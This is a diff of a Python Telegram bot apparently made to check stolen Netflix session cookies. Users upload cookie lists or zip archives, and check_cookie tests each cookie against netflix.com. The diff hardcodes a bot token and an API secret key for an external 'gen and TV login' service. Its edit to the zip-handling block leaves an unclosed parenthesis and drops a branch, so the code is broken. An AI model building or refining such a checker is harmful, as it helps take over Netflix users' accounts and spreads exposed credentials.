@@ -1,4 +1,3 @@
-
 import requests
 import logging
 import time
@@ -35,8 +34,6 @@ BOT_TOKEN = "8477278414:AAHAxLMV9lgqvSCjnj_AIDnH6pxm82Q55So"
 ADMIN_ID = 6176299339
 CHANNELS = ["@F88UFNETFLIX", "@F88UF9844"]
 USERS_FILE = "users.txt"
-
-# Increased Semaphores for much faster concurrent screenshot rendering
 SCREENSHOT_SEMAPHORE = threading.Semaphore(20) 
 
 app = Flask(__name__)
@@ -60,7 +57,6 @@ HEADERS = {
     "Origin": "https://www.netflix.com",
 }
 
-# --- NFTGEN API BASE SETUP ---
 API_BASE_URL = "http://nftgenapi.onrender.com/api"
 SECRET_KEY = "KUROSAKI_YtkX2SnPDdtn0jU9fVyE0iSIGnjPaYIO"
 
@@ -178,7 +174,6 @@ def extract_deep_details(html):
 
     return details
 
-# --- API HELPER FUNCTION (Handles both Gen & TV Login) ---
 def call_api(endpoint, payload):
     try:
         payload["secret_key"] = SECRET_KEY
@@ -239,7 +234,6 @@ def check_cookie(cookie_input):
         
         for c in playwright_cookies: session.cookies.set(c['name'], c['value'], domain=c['domain'])
 
-        # Fast HTTP Check
         resp = session.get("https://www.netflix.com/browse", timeout=7, allow_redirects=False)
         if resp.status_code == 302 and "login" in resp.headers.get("Location", ""): return {"valid": False, "msg": "Redirected to Login (Dead)"}
         if resp.status_code == 200 and "login" in resp.url: return {"valid": False, "msg": "Redirected to Login (Dead)"}
@@ -410,10 +404,11 @@ def main():
                 if message.document.file_name.endswith('.zip'):
                     with zipfile.ZipFile(io.BytesIO(downloaded_file)) as z:
                         for filename in z.namelist():
-              if filename.endswith('.txt'):
-                                with z.open(filename) as f: cookies.extend(f.read().decode('utf-8', errors='ignore').splitlines())
-                else: cookies = downloaded_file.decode('utf-8', errors='ignore').splitlines()
-            else: cookies = message.text.splitlines()
+                            if filename.endswith('.txt'):
+                                with z.open(filename) as f:
+                                    cookies.extend(f.read().decode('utf-8', errors='ignore').splitlines()
+            else:
+                cookies = message.text.splitlines()
             
             valid_cookies = [c.strip() for c in cookies if len(c.strip()) > 50 and ("NetflixId" in c or "netflix" in c.lower() or "=" in c)]
             
